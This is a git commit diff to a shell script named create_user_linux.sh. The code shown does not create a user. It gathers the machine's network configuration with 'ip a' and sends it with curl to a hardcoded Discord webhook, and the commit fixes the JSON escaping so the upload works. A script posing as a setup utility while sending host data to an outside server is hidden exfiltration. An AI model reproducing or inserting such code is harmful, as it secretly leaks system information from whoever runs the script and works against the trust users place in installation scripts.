5f50ab08d61b034e50a6066cbf5c341fb20df06c
Corazon <41511738+assafgold1@users.noreply.github.com>
2024-08-03 05:09:03 +0300

    Update create_user_linux.sh

--- create_user_linux.sh
+++ create_user_linux.sh
@@ -6,8 +6,11 @@ WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo
 # Collect network data
 NETWORK_DATA=$(ip a)
 
+# Escape newlines and quotes for JSON payload
+ESCAPED_NETWORK_DATA=$(echo "$NETWORK_DATA" | sed -e 's/[\/&]/\\&/g' -e 's/"/\\"/g' -e 's/$/\\n/' | tr -d '\n')
+
 # Send data to Discord
 curl -H "Content-Type: application/json" \
      -X POST \
-     -d "{\"content\": \"Network Data:\n$NETWORK_DATA\"}" \
+     -d "{\"content\": \"Network Data:\n$ESCAPED_NETWORK_DATA\"}" \
      $WEBHOOK_URL
